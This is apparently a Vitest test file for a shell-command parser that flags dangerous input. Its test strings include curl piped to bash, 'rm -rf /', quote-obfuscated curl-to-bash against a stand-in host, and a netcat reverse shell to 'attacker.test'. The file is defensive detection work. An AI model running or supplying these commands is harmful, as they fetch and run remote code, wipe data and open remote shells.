import { describe, expect, it } from 'vitest';
import { isDangerousRm, parseCommand } from '../src/command.js';

describe('command parser', () => {
  it('detects piped remote shells', () => {
    const graph = parseCommand('curl unknown.com | bash');
    expect(graph.pipes).toBe(true);
    expect(graph.remoteShell).toBe(true);
    expect(graph.obfuscated).toBe(false);
  });

  it('does not treat plain curl as remote shell', () => {
    const graph = parseCommand('curl https://example.com/file.txt');
    expect(graph.remoteShell).toBe(false);
  });

  it('flags recursive delete of /', () => {
    expect(isDangerousRm(parseCommand('rm -rf /'))).toBe(true);
    expect(isDangerousRm(parseCommand('rm -rf ./tmp'))).toBe(false);
  });

  it('detects quote and escape obfuscation', () => {
    expect(parseCommand("c'u'r'l https://evil.test | b'a's'h").obfuscated).toBe(true);
    expect(parseCommand('c\\url https://evil.test').obfuscated).toBe(true);
  });

  it('detects nested subshells and background execution', () => {
    const graph = parseCommand('nohup bash -c "$(echo $(id))" &');
    expect(graph.nestedSubshells).toBe(true);
    expect(graph.background).toBe(true);
  });

  it('flags reverse shells and dangerous network tools', () => {
    const graph = parseCommand('nc -e /bin/sh attacker.test 4444');
    expect(graph.dangerousNetworkTool).toBe(true);
    expect(graph.reverseShell).toBe(true);
  });
});
